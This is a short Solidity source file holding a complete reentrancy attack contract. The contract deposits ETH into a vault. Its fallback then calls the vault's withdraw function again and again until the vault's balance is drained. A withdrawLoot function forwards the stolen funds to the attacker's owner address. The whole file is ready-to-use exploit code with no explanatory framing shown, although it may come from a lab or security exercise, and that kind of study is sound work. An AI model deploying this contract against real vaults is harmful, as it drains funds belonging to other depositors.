// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IVulnerableVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "Not owner");
        require(msg.value > 0, "Need ETH");

        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
